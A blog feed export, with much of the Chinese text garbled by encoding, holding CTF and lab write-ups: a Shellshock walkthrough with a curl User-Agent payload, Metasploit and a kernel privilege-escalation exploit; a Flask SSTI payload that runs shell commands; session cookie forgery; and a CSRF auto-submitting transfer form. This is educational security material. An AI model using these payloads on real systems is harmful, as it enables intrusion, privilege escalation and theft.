´è§£å¾—åˆ°å¼±å£ä»¤letmeinï¼Œç»“æœæ˜¯é”™çš„ï¼Œä»æ— æ³•è¿›sshã€‚ äº‹æƒ…ä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†è½¬èº«ä»–åˆæ¢äº†ä¸ªæ€è·¯è¿›ç½‘ç«™çš„/cgi-binï¼Œä½†æ˜¯å‘ç°permission deniedï¼Œå…³äºcgi-binï¼ˆCommon Gateway Interfaceï¼‰è°·æ­Œæœ‰ä»‹ç»ã€‚ä»–å…³æ‰gobusterç›®å½•æ‰«æè½¬è€Œå¼€å§‹æšä¸¾æ‰«æå…·ä½“æ–‡ä»¶ å…¶å®åœ¨æ­¤ä¹‹å‰ä»–çœ‹äº†ä¸‹ç½‘ç«™é¦–é¡µçš„æœåŠ¡å™¨å“åº”å¤´æ˜¯Apache/Ubuntuï¼Œè¿™è¯´æ˜cgi-binä¸‹çš„åº”ç”¨åº”è¯¥å¤§å¤šä¸ºbashï¼Œè€Œéexeç­‰åº”ç”¨ç¨‹åºï¼Œè¿™ä¾¿ä¸ºä¸‹æ–‡æš´åŠ›ç ´è§£æŒ‡å®šæ–‡ä»¶å°¾ç¼€åšäº†è§£é‡Š</p><pre><code>gobuster dir -x sh,cgi,log,html,php -u http://10.10.14.250/cgi-bin/ -w /usr/share/wordlists/disbuster/xxxx.txt</code></pre><p>åœ¨æ‰«ææ—¶ï¼Œä»–å›è¿‡èº«å»çœ‹niktoçš„æ‰«æï¼Œæ— ç‹¬æœ‰å¶ï¼Œniktoä¹ŸæŒ‡å‡ºcgi-binä¼¼ä¹æœ‰æ¼æ´ï¼Œç”šè‡³æ›´è¿›ä¸€æ­¥æŒ‡å‡ºå¯èƒ½æ˜¯æœ‰shellshock vulnerability. ä»–è¿›ä¸€æ­¥å‘ç°cgi-binä¸‹å­˜åœ¨test.cgiï¼Œè®¿é—®åè¾“å‡ºJHello Worldï¼,ä»–çœ‹äº†CVEä»‹ç»å’Œç»´åŸºç™¾ç§‘äº†è§£äº†æ¼æ´å¤§æ¦‚æ—¶ä¼šé€ æˆRCEåäº†è§£äº†å¤§æ¦‚ä½¿ç”¨æ–¹æ³•ï¼Œè¿›è€Œå»githubæ‰¾ç°æˆçš„Poc</p><pre><code>Payload: curl -H &quot;User-Agent: () &#123; : ; &#125;; echo; echo; /bin/bash -c &#39;id&#39;&quot; &quot;http://xxx.xxx.xxx.xxx/cgi-bin/test.cgi&quot;</code></pre><p>ä½œè€…æåˆ°çš„æ˜¯ï¼ŒåŸæœ¬çš„payloadç”¨çš„æ˜¯ env X=,ä½†åœ¨æœ¬ä¾‹å¯èƒ½æ˜¯ç›´æ¥ç±»ä¼¼ç»ˆç«¯è¾“å‡ºæ‰€ä»¥ä¸ç”¨envï¼ŒåŒæ—¶å…¶ä¸­æ¶‰åŠçš„æ–‡ä»¶è·¯å¾„åº”å½“æ˜¯ç»å¯¹è·¯å¾„ã€‚</p><p>å‘ç°æœ‰è¿™ä¸ªæ¼æ´åï¼Œå®ƒä½¿ç”¨äº†metasploit</p><pre><code>msfconsolemsf5&gt;search shellshockmsf5&gt;use exploit_name # choose the tool you want to usemsf5&gt;exploit(name_xxxxxx)(*)no payload configuredmsf5&gt;exploit(name_xxxxxx)&gt;show optionsè®¾ç½®ç›¸å…³å‚æ•°åmasf5&gt;exploit(name_xxxxxx)&gt;run</code></pre><p>ä¹‹åä¾¿æˆåŠŸåå¼¹shellï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ææƒæ‹¿åˆ°root</p><p>åå¼¹shellä¸­ls -laçœ‹åˆ°æœ‰ä¿©ç”¨æˆ·ryanï¼ŒrootåŒæ—¶åå¼¹shellç”¨æˆ·æ˜¯wwwç”¨æˆ·</p><p>ctrl+c ä¸­æ­¢å›åˆ°meterpreter</p><pre><code>meterpreter&gt;cd /dev/shmmeterpreter&gt;shell -i # nothing happensmeterpreter&gt;upload /opt/linpeas.shmeterpreter&gt;shell -ibash -iwww@ubuntu:/run/shm$ chmod +x linpeas.shwww@ubuntu:/run/shm$ ./linpeas.sh  tee linlog.txt</code></pre><p>linpeaæ­ç¤ºäº†æœºå™¨å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒè€ä¸º 3.13.0-32generic</p><pre><code>searchsploit 3.13.0-----------------------------------------------------------------------------------Exploit Title                                         Path -----------------------------------------------------------------------------------Linux Kernel 3.13.0 &lt;3.19(Ubuntu 12.           linux/local/37292.cLinux Kernel 3.13.0 &lt;3.19(Ubuntu 12.           linux/local/37293.txtShellcodes: No Resultssearchsploit -x linux/local/37292.c# skim the filesearchsploit -x linux/local/37293.txt# skim the filesearchsploit -m linux/local/37292.c# mirror the poc file</code></pre><pre><code>meterpreter &gt; upload xxx/37292.cmeterpreter &gt; gcc ./37292.cmeterpreter &gt; ./37292.croot&gt;</code></pre><p>æœ€ç»ˆææƒæˆåŠŸ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;åŸYouTubeè§†é¢‘ï¼š&lt;a href=&quot;https://www.youtube.com/watch?v=TS%5C_yfDqr%5C_3s&quot;&gt;https://www.youtube.com/watch?v=TS\_yfDqr\_3s&lt;/a&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>CTFä¹‹Flaskåˆæ¢</title>
    <link href="https://zwh-china.github.io/2020/11/23/syc%E4%BA%8C%E9%9D%A2-wp/"/>
    <id>https://zwh-china.github.io/2020/11/23/syc%E4%BA%8C%E9%9D%A2-wp/</id>
    <published>2020-11-23T01:19:09.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>For most cases I have met so far,they use Jinja2 template. In some ways I list some of the points appear in the Flask CTF Problem</p><ul><li>  Crack PIN via DebugConsole get shell</li><li>  SSTIï¼ˆServer Side Template Injectionï¼‰</li><li>  Python BaseClasses</li><li>  Session Cheat</li><li>   Flag in Environment</li><li>  â€¦</li></ul><p>CTF problems often aim to check multiple points in a single problem. So the Flask problem often mix two or more points for example, a basic Flask problem I came across during my second interview in SYC Group. The problem mix the SSTI ,Session Cheat together with some of the bypass technique. However,no matter how the problem is set,there must be a or some break points. For example the File Upload Vulnerability you can upload your payload to one of the specific file on the server where the template will be rendered. And during the process you may need to use Directory Traversal vulnerability to carry out the exploit. In the following part I will issue some of the way to solve the specific problem I mentioned above.</p><h2 id="PIN"><a href="#PIN" class="headerlink" title="PIN"></a>PIN</h2><p>The pin of Flask debug console is generated in certain way if we can store enough information we can try to reverse the PIN and enter it in the debug console and then get shell.</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI referring as Server Side Template Injection often appears in the comment or contact section of the web page. If you input some of the elaborated designed payload then there may be a chance to trigger SSTI and get some of the sensitive information or get reverse shell , OOB and RCE.</p><h2 id="Python-Base-Classes"><a href="#Python-Base-Classes" class="headerlink" title="Python Base Classes"></a>Python Base Classes</h2><p>Flask itself is based on Python so it is easy to think that if there is any chance that we can run Python through Flask. Luckily it is accessible. By using such payload</p><pre><code>  &#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;  # get base class information  # try to find OS or Popen  &#123;&#123;''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("cat /super_secret_fla''g.txt")').read()&#125;&#125;</code></pre><p>And by this way you can attain RCE and even create a Reverse Shell</p><p>In most CTF game there is a WAF for example they may ban â€˜{}â€™ or â€˜_â€˜ and etc. There are many way to bypass I will not enume them here.</p><h2 id="Session-Cheat"><a href="#Session-Cheat" class="headerlink" title="Session Cheat"></a>Session Cheat</h2><p>Session cheat is a very interesting trick. The session was generated in a certain way when you attain the SecretKey you can generate your custom content and replace your cookie to cheat you are admin. I use the flask_session_cookie_manager on github and <a href="https://jwt.io/">https://jwt.io</a> to do this job. But you should make sure you enter the  page and get Secret_Key.</p><h5 id="About-Flask-SSID"><a href="#About-Flask-SSID" class="headerlink" title="About Flask SSID"></a>About Flask SSID</h5><p>The generation of Flask SSID</p><p>Front Part: base64 encode json segment</p><p>End Part: Signature part generated through Secret_Key</p><p>(most cases they use hash256 algorithm)</p><h2 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h2><p>1)<a href="https://xz.aliyun.com/t/8029">æµ…è°ˆflask ssti ç»•è¿‡åŸç† - å…ˆçŸ¥ç¤¾åŒº</a></p><p>2)<a href="https://0day.work/ictf-2017-flasking-unicorns-writeup-or-how-we-might-have-rooted-your-ictf-vm/#flaskingunicorns">iCTF 2017 flasking unicorns writeup - Or how we might have rooted your iCTF VM Sebastian Neef - 0day.work</a></p><p>3)<a href="https://hackmd.io/@Chivato/HyWsJ31dI">Jinja2 SSTI Research - HackMD</a></p><p>4)<a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨ - å…ˆçŸ¥ç¤¾åŒº</a></p><p>5)<a href="https://my.oschina.net/u/4416864/blog/3625351">python-flask-ssti(æ¨¡ç‰ˆæ³¨å…¥æ¼æ´) - osc_1x3afxmvçš„ä¸ªäººç©ºé—´ - OSCHINA - ä¸­æ–‡å¼€æºæŠ€æœ¯äº¤æµç¤¾åŒº</a></p><p>6)<a href="https://www.cnblogs.com/zaqzzz/p/10263396.html">SSTIæ³¨å…¥ç»•è¿‡(æ²™ç›’é€ƒé€¸åŸç†ä¸€æ ·) - å†¬æ³³æ€ªé¸½ - åšå®¢å›­</a></p><p>7)<a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">SSTIæ³¨å…¥è¯­å¥æ€»ç»“_G0blinKçš„åšå®¢-CSDNåšå®¢</a></p><p>8)<a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">æµ…æSSTI(pythonæ²™ç›’ç»•è¿‡)_ç™½å¸½å­æŠ€æœ¯/æ€è·¯_iæ˜¥ç§‹ç¤¾åŒº-åˆ†äº«ä½ çš„æŠ€æœ¯ï¼Œä¸ºå®‰å…¨åŠ ç‚¹æ¸©åº¦.</a></p><p>9)<a href="https://blog.csdn.net/qq_45521281/article/details/106243544">SSTI æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥_Mr. Anonymousçš„åšå®¢-CSDNåšå®¢</a></p><p>10)<a href="https://www.it610.com/article/1293120386883461120.htm">ssti(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥çš„æ€»ç»“åŠå‡ é“ä¾‹é¢˜) - it610.com</a></p><p>11)<a href="https://blog.csdn.net/m0_37519490/article/details/80774069">flaskå­¦ä¹ ç¬”è®°â€“flaskå†…ç½®sessionå¤„ç†æœºåˆ¶_xuewenå°æ¸£æ¸£çš„åšå®¢-CSDNåšå®¢</a></p><p>12)<a href="https://www.cnblogs.com/zaqzzz/p/10243961.html">flaskåˆ©ç”¨sessionèº«ä»½ä¼ªé€  - å†¬æ³³æ€ªé¸½ - åšå®¢å›­</a></p><p>åˆ©ç”¨å·¥å…·</p><p>1ï¼‰<a href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a></p><ol start="2"><li><a href="https://jwt.io/">JWT</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;For most cases I have met so far,they use Jinja2 template. In some ways I list some of the points appear in the Flask CTF Pr</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>GeekChallenge-WriteUp</title>
    <link href="https://zwh-china.github.io/2020/11/19/geekchallenge-writeup/"/>
    <id>https://zwh-china.github.io/2020/11/19/geekchallenge-writeup/</id>
    <published>2020-11-19T03:49:49.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h3 id="Web-Welcome"><a href="#Web-Welcome" class="headerlink" title="Web-Welcome"></a>Web-Welcome</h3><p>è¿™é“é¢˜emmä¼°è®¡ç»™ä¸å°‘é©¬è™çš„äººå½“å¤´ä¸€æ£’ï¼Œè¯¶ï¼Œé™¤äº†GETè¿˜æœ‰å•¥æ–¹å¼ï¼Ÿé‚£è‚¯å®šæ˜¯postå•Šï¼Œæœæ–­éšä¾¿POSTä¸ªæ•°æ®è¿‡å»ç©ç©ï¼Œå—¯ï¼Ÿçœ‹åˆ°äº†ç‚¹æºç ï¼Œç®€å•åˆ†æä¸€ä¸‹ï¼Œå®³ï¼Œä¸å°±æ˜¯sha1ç»•è¿‡å˜›ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œå’±å¯ä»¥æ¥ç¡¬æ ¸ç‚¹çš„ç›´æ¥åˆ©ç”¨sha1ç¢°æ’ï¼Œä¹Ÿå¯ä»¥æ¸©æŸ”ç‚¹çš„æ•°ç»„ç»•è¿‡ä¾‹å¦‚ roam1[]=1&amp;roam2[]=2ç„¶åå³å¯è¿›å…¥phpinfoï¼Œè¿™ä¸œè¥¿å…¶å®æŒºé‡è¦çš„ï¼Œç®€å•é˜…è§ˆï¼Œåœ¨coreä¸‹çœ‹åˆ°ç–‘ä¼¼flagæ–‡ä»¶çš„è·¯å¾„ï¼Œå“‡ï¼Œå¦‚æ­¤ç®€å•ï¼Œç›´æ¥è®¿é—®ï¼Œæˆ‘æ“¦ï¼Œæ€ä¹ˆå›äº‹ï¼Œå±…ç„¶404 Not Foundï¼Œä½ åœ¨é€—æˆ‘ï¼Ÿï¼Ÿï¼Ÿå¼€F12çœ‹ä¸‹å“åº”æŠ¥æ–‡ä¾¿å¯æ‹¿åˆ°flagï¼Œè¿™æ‹›çœŸæ˜¯é˜´é™©ã€‚P.Sæ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹éœ€è¦æ³¨æ„ï¼Œå¯èƒ½æœ‰äººç›´æ¥å»è®¿é—®<a href="http://49.234.224.119:8000/var/www/html/f1444aagggg.php">http://49.234.224.119:8000/var/www/html/f1444aagggg.php</a>ï¼Œè¿™æ ·åœ¨è¿”å›æŠ¥æ–‡æ—¶çœ‹ä¸åˆ°flagçš„ï¼Œå› ä¸º<a href="http://49.234.224.119:8000/">http://49.234.224.119:8000/</a>å…¶å®å°±ä»£è¡¨äº†å¤„äºhtmlç›®å½•ï¼Œå› è€Œæƒ³è®¿é—®ä½éœ€è¦/f1444aagggg.phpå³å¯SYC{w31c0m3_t0_5yc_r0@m_php1}</p><h3 id="Web-flagshop"><a href="#Web-flagshop" class="headerlink" title="Web-flagshop"></a>Web-flagshop</h3><p>flagshopè¿™é“é¢˜å…¶å®æœ‰ç›¸å½“å¤šCTFé¢˜ç›®ç±»ä¼¼ï¼Œè¿™ç±»é¢˜éœ€è¦æŠŠä½¿å¾—è‡ªå·±ä½™é¢å˜å¾—å¾ˆå¤§ä»è€Œå¾—åˆ°flagï¼Œä¸ºè¾¾åˆ°è¿™ç‚¹æ‰€é‡‡å–çš„æ‰‹æ®µä¹Ÿå¯è°“äº”èŠ±å…«é—¨ä»€ä¹ˆæº¢å‡ºä¹‹ç±»çš„éƒ½æœ‰ï¼Œæˆ‘ä»¬ä¸ççŒœä¸Šæ¥å…ˆçœ‹ï¼Œå¥½å®¶ä¼™ï¼Œæµªçˆ·æœ€æœ‰é’±äº†ï¼Œå†çœ‹æœ‰ä¸ªè½¬è´¦å’Œä¹°flagçš„åœ°æ–¹ï¼Œè¿˜æœ‰ä¸ªæŠ¥å‘Šã€‚è¿™ä¸ç”±å¾—ä½¿äººæƒ³åˆ°XSSæ”»å‡»ï¼Œå½“ç„¶å…¶å®æœ‰äº›ç»†èŠ‚èƒ½ä½“ç°ä¾‹å¦‚åœ¨åé¦ˆçš„é‚£ä¸ªç•Œé¢ï¼Œåªæœ‰æŠ•è¯‰æ˜¯æµªçˆ·å›å¤ï¼Œå¹¶ä¸”æµªçˆ·æš—ç¤ºæˆ‘ä¼šå¥½å¥½çœ‹ä½ ä»¬çš„æŠ¥å‘Šï¼Œè¿™ä¾¿è®©æˆ‘æƒ³åˆ°CSRFï¼Œå†çœ‹è½¬è´¦ï¼Œåº”è¯¥æ˜¯é€šè¿‡SSIDåˆ¤æ–­ä½™é¢ï¼Œé‚£ä¹ˆç›®å‰å°±å¥½è¯´äº†ï¼Œåªè¦æµªçˆ·ç‚¹è½¬è´¦è¿æ¥ï¼Œä»–å°±ä¼šç»™æˆ‘æ‰“é’±ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œæ˜¯åˆ©ç”¨çš„POSTå› è€Œä¸èƒ½ç®€å•ä¼ ä¸€ä¸ªå«å‚è¿æ¥è®©ä»–å»ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å€ŸåŠ©ä¸€ä¸ªä¸­é—´ç«™ç‚¹ï¼Œè®©æµªçˆ·å‰å¾€åä¼ªé€ è¡¨å•æäº¤è¿›è¡Œè½¬è´¦ï¼Œä¸­é—´æœåŠ¡å™¨çš„é’“é±¼ç•Œé¢ä»£ç å¦‚ä¸‹</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;http://173.82.206.142:8005/transfer.php&quot; id=&quot;test&quot; method=&quot;POST&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;target&quot;&gt;&lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;money&quot;&gt;&lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;messages&quot;&gt;            &lt;/form&gt;&lt;/body&gt;&lt;script&gt;    var f=document.getElementById(&quot;test&quot;);    f.getElementsByTagName(&quot;input&quot;)[0].value=&quot;CUITCUIT&quot;;    f.getElementsByTagName(&quot;input&quot;)[1].value=&quot;100000000000000000000000&quot;;    f.getElementsByTagName(&quot;input&quot;)[2].value=&quot;RCE&quot;;    f.submit();&lt;/script&gt;&lt;/html&gt;</code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæäº¤ç•Œé¢è¦é€‰æŠ•è¯‰ï¼ŒéªŒè¯ç çš„å«ä¹‰æ˜¯ï¼ŒéªŒè¯ç å‰5ä½ç¬¦åˆç»™å®šå¼æ ·ï¼Œç›´æ¥Pythonç®—ä¸€ä¸‹å³å¯ï¼Œè¿™é‡Œå€¼å¾—æåˆ°çš„ä¸€ç‚¹æ˜¯PHPé»˜è®¤ç”¨32ä½MD5ï¼Œè€Œé16ä½MD5ï¼Œè¿™ä¸¤ç§MD5åŠ å¯†åŒä¸€ä¸ªå¯†æ–‡ï¼Œç»“æœæ˜¯å®Œå…¨ä¸ç›¸åŒçš„SYC{cross_s1t3_r3q43st_4orgery_1s_44nny}</p><h3 id="Web-æœ‹å‹çš„å­¦å¦¹"><a href="#Web-æœ‹å‹çš„å­¦å¦¹" class="headerlink" title="Web-æœ‹å‹çš„å­¦å¦¹"></a>Web-æœ‹å‹çš„å­¦å¦¹</h3><p>è¿™é¢˜ç™½ç»™å¥½å§ï¼Œview-sourceï¼Œbase64ç›´æ¥æŠŠflag=U1lDe0YxQF80c19oNExwZnVsbGxsbGx9ä¸­â€=â€åçš„å†…å®¹ï¼Œbase64decodeå³å¯ï¼Œæˆ‘èµ·äº†ä¸€æªç§’äº†ï¼Œæœ‰ä»€ä¹ˆå¥½è¯´çš„ã€‚SYC{F1@_4s_h4Lpfullllll}</p><h3 id="Web-EZwww"><a href="#Web-EZwww" class="headerlink" title="Web-EZwww"></a>Web-EZwww</h3><p>è¿™é“é¢˜å…¶å®å¾—å‡­ä¸€å®šç»éªŒï¼Œåœ¨å„å¤§å¹³å°é¢˜åšå¤šäº†ï¼Œæˆ–è€…ä½ ç™¾åº¦å‡ºäº†ï¼Œå¾—çŸ¥å¯ä»¥<a href="http://47.100.46.169:3901/www.zip">http://47.100.46.169:3901/www.zip</a>å¯ä»¥æŠŠç½‘ç«™å¤‡ä»½ä¸‹è½½ï¼Œè¿™é“é¢˜ä½ å°±åšå‡ºæ¥80%äº†ï¼Œä¸‹è½½åè§£å‹ï¼Œç›´æ¥æ‰“å¼€flagï¼Œä½ ä»¥ä¸ºç§’äº†ï¼Œä¸ï¼Œè¿˜å·®ç‚¹ï¼Œè¿™ä¸ªSYC{th1s_1s_4_f4ke_fl4g}è‚¯å®šéª—äº†ä¸å°‘æ¿€åŠ¨çš„æ²¡ç»†çœ‹çš„Geekerï¼Œä»”ç»†ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œæ˜¯fakeflagå•Šï¼Œè¿˜å¾—ä¹–ä¹–å›æ¥çœ‹indexï¼Œè¯»å®Œä»£ç ï¼Œå°±èƒ½æ˜ç™½ï¼Œå°±æ˜¯å¾—POSTä¸€ä¸ªaè®©å…¶ç­‰äºc3ljbDB2ZXI=åœ¨base64decodeåçš„ç»“æœï¼Œåœ¨çº¿base64decodeä¸€ä¸‹å¾—åˆ°sycl0verï¼Œç›´æ¥POSTè¿‡å»ï¼Œè½»æ¾æ‹¿ä¸‹åªè§åˆéŸ³gifï¼ˆæˆ‘å·²ç»ç™½å«–äº†è¿™ä¸ªgifå­˜è¡¨æƒ…äº†ï¼‰ä¸‹å‡ºç°SYC{Backup_1s_4_good_h4bit_l0l}</p><h3 id="Web-EZgit"><a href="#Web-EZgit" class="headerlink" title="Web-EZgit"></a>Web-EZgit</h3><p>è¿™é“é¢˜ï¼Œä¸»è¦è¿˜æ˜¯ç¯å¢ƒé…ç½®ï¼Œè™½è¯´åªéœ€è¦Githackæˆ–è€…Githackerï¼Œä½†æ˜¯å› ä¸ºå¤§éƒ¨åˆ†å·¥å…·é‡‡ç”¨Python2ï¼Œè€Œæˆ‘ä»¬ç›®å‰ç”µè„‘è£…çš„ä¸€èˆ¬ä»¥Python3ä¸ºä¸»ï¼Œå¹¶ä¸”æˆ‘åœ¨win10ç¯å¢ƒä¸‹æ€»æ˜¯æŠ¥é”™ï¼Œæ¢äº†å¾ˆå¤šç‰ˆæœ¬ä¹Ÿæ²¡ç”¨ã€‚è¿«ä¸å¾—å·²ç”¨kaliå®‰è£…äº†GitHackä½¿ç”¨å‘½ä»¤ python GitHack <a href="http://47.100.46.169:3902/.git">http://47.100.46.169:3902/.git</a> æ‰§è¡Œåç”Ÿæˆå¯¹åº”ç›®å½•ï¼Œæ˜¾ç¤ºflag too oldï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦å¯¹gitæœ‰ä¸€å®šåŸºæœ¬äº†è§£ï¼Œcdè¿›å…¥è½¯ä»¶ç”Ÿæˆçš„å¯¹åº”ç›®å½•ï¼Œä½¿ç”¨git log â€“reflogå¾—åˆ°å†å²commitä¿¡æ¯ï¼Œç„¶åç”¨git reset â€“hardå¤åŸç‰ˆæœ¬ï¼Œå¾—åˆ°fl4g.phpï¼Œä»è€Œå¾—åˆ°flagã€‚SYC{I_l0ve_sycl0ver_l0l}</p><h3 id="Web-åˆ˜å£®çš„é»‘é¡µ"><a href="#Web-åˆ˜å£®çš„é»‘é¡µ" class="headerlink" title="Web-åˆ˜å£®çš„é»‘é¡µ"></a>Web-åˆ˜å£®çš„é»‘é¡µ</h3><p>è¿™é¢˜æœ€å¤§å‘ç‚¹å°±æ˜¯è¿›å»äº†æ‰¾ä¸åˆ°ä»£ç ï¼Œå¾—ç¿»åˆ°æœ€ä¸‹é¢ï¼Œazï¼Œç„¶åç¬¬äºŒå‘ï¼Œusernameå’Œpasswdä¸€ä¸ªGETä¸€ä¸ªPOSTï¼Œè¿™ä¸¤ç‚¹éƒ½æ³¨æ„åˆ°è¿™ä¸ªé¢˜å°±èƒ½è½»æ¾ç§’äº†ã€‚SYC{d0_y0u_k0nw_GET?}</p><h3 id="Web-æˆ‘æ˜¯å¤§é»‘å®¢"><a href="#Web-æˆ‘æ˜¯å¤§é»‘å®¢" class="headerlink" title="Web-æˆ‘æ˜¯å¤§é»‘å®¢"></a>Web-æˆ‘æ˜¯å¤§é»‘å®¢</h3><p>è¿™é¢˜åº”è¯¥æ˜¯ä¸ºäº†ç§‘æ™®èšå‰‘çš„ä½¿ç”¨ï¼Œå…¸å‹çš„ä¸€å¥è¯shellï¼ŒæŒ‰è¦æ±‚æŠŠä¸œè¥¿ä¸‹ä¸‹æ¥ï¼Œæ³¨æ„ä¸‹ï¼Œéƒ¨åˆ†ç”µè„‘ä¼°è®¡è¯†åˆ«ä¸ºzipä¹‹ç±»çš„å‹ç¼©åŒ…æ ¼å¼ï¼Œå¯¼è‡´ä¸å°‘äººä»¥ä¸ºè¿™ç©æ„æ˜¯å‹ç¼©æ–‡ä»¶æ‰“ä¸å¼€ï¼Œå®é™…ä¸Šåˆ é™¤å°¾ç¼€.bakå³å¯å½“ä½œliuzhuang.phpæ‰“å¼€ï¼Œæ‰“å¼€åå¾—åˆ°ä¸€å¥è¯å¯†é’¥liuzhuangï¼Œå€¼å¾—ä¸€æçš„æ˜¯æˆ‘åœ¨githubä¸‹è½½çš„èšå‰‘ï¼Œåœ¨åˆå§‹åŒ–è§£å‹æ—¶å‡ºé”™ï¼Œæœ€åé€šè¿‡æ‰‹åŠ¨è§£å‹å¾—ä»¥è§£å†³ï¼ŒåŒæ—¶èšå‰‘æ˜¯githubçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå¤§å®¶åˆ«å»ç¬¬ä¸‰æ–¹ä¸‹è½½ï¼Œè¿™ç§æ¸—é€å·¥å…·éå¸¸å®¹æ˜“è—åé—¨ã€‚è¿›å…¥åè·³è½¬è‡³æ ¹ç›®å½•ä¾¿èƒ½çœ‹è§é†’ç›®çš„flagæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°SYC{1iuzHuang_yyd_G0d!}</p><h3 id="Web-ezbypass"><a href="#Web-ezbypass" class="headerlink" title="Web-ezbypass"></a>Web-ezbypass</h3><p>æŒ‰å›¾ç´¢éª¥ï¼Œstrcmpå‡½æ•°å±äºè€å¥—è·¯äº†ï¼Œä»–æƒ³æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ååä¸ç»™å®ƒå­—ç¬¦ä¸²ï¼Œç»™å®ƒä¿©æ•°ç»„è¿™æ ·strcmpè¿”å›å€¼ä¾¿æ˜¯NULLï¼Œåœ¨æŒ‰è¦æ±‚ä»¥GETå½¢å¼ä¸Šä¼ åï¼Œå¾—åˆ°æç¤ºï¼Œç¬¬ä¸€æ­¥å®Œæˆï¼Œç¬¬äºŒæ­¥ä¼ ä¸€ä¸ªå­—ç¬¦ï¼Œè®©ä»–å€¼ä¸º123ï¼Œè¯´å¥å®è¯è¿™é¢˜æˆ‘ä¹Ÿåƒäº†äºï¼Œä»¥ä¸ºæ‰¾ä¸ªASCIIå€¼ä¸º123çš„charå³å¯ï¼Œä¹Ÿå°±æ˜¯â€{â€œï¼Œä½†æ˜¯æ­»æ´»ä¸è¡Œï¼Œæœ€åæ‰è€ƒè™‘åˆ°ç”¨æ­£åˆ™é˜¶æ®µ%00ç»•è¿‡ï¼Œè¿™å…¶å®ä¹Ÿç®—å¥—è·¯äº†ï¼Œæ³¨æ„è¿™é‡Œæ˜¯POSTæ–¹æ³•ä¸Šä¼ ï¼Œå¹¶ä¸”å€¼å¾—ä¸€æçš„æ˜¯%00çš„æ­£åˆ™ç»•è¿‡åªå¯¹PHPç‰ˆæœ¬å°äº5.3.4èµ·ä½œç”¨ï¼Œå®ƒçš„ä½œç”¨æŒºå¤šå¶å°”çš„è¯ä¸Šä¼ æ–‡ä»¶å¯èƒ½ç”¨%00é˜¶æ®µç»•è¿‡ç±»å‹åˆ¤æ–­ï¼ŒåŒæ—¶æˆ‘åœ¨ä¸€ç¯‡æ–‡ç« çœ‹åˆ°æ•°æ®å½“æ˜¯POSTæ¥æ”¶æƒ…å†µçš„æ—¶å€™ï¼Œæ­£ç¡®çš„ç”¨æ³•åº”è¯¥æ˜¯æˆ‘ä»¬éœ€è¦å¯¹ %00 åšä¸€ä¸ªURLç¼–ç ï¼Œä¹Ÿå°±æ˜¯URL-decodeï¼Œè¿™æ˜¯å› ä¸º %00 æˆªæ–­åœ¨ GET ä¸­è¢« url è§£ç ä¹‹åæ˜¯ç©ºå­—ç¬¦ã€‚ä½†æ˜¯åœ¨ POST ä¸­ %00 ä¸ä¼šè¢« url è§£ç ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ burpsuite ä¿®æ”¹ hex å€¼ä¸º 00 ï¼ˆURL decodeï¼‰è¿›è¡Œæˆªæ–­ã€‚ä½†åœ¨æœ¬é¢˜ä¸­å¹¶æœªä½“ç°ã€‚SYC{php_4s_so_funny}</p><h3 id="Web-çŸ¥Xå ‚çš„phpæ•™ç¨‹"><a href="#Web-çŸ¥Xå ‚çš„phpæ•™ç¨‹" class="headerlink" title="Web-çŸ¥Xå ‚çš„phpæ•™ç¨‹"></a>Web-çŸ¥Xå ‚çš„phpæ•™ç¨‹</h3><p>è¿™é¢˜ä¸»è¦åˆ©ç”¨execå±é™©å‡½æ•°ï¼Œè¿™é¢˜æå…¶é˜´é™©å› 